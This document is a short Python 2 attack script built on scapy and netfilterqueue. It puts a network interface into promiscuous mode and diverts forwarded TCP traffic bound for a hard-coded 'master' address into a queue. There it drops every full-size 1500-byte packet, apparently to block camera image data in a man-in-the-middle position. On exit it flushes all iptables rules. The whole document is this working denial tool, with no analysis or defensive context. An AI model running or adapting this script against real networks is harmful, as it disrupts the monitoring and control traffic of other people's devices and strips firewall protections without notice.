#!/usr/bin/python
from scapy.all import *
from netfilterqueue import NetfilterQueue
import sys
import os
import time

masterIP = "192.168.1.241"

print "\n[*] Redirect traffic to the NFQUEUE... \n"
os.system("ip link set dev enp0s3 promisc on")
os.system("iptables -A FORWARD -p tcp --tcp-flags ALL PSH,ACK -d "+masterIP+" -j NFQUEUE --queue-num 1")

def deny_camera_image(pkt):
    packet = IP(pkt.get_payload())
    if packet[IP].len==1500:
        print(pkt)
        pkt.drop()
    else:
        pkt.accept()


nfqueue = NetfilterQueue()
nfqueue.bind(1, deny_camera_image) 
try:
    print "[*] waiting for data"
    nfqueue.run()
except KeyboardInterrupt:
    nfqueue.unbind()
    os.system("iptables -F")


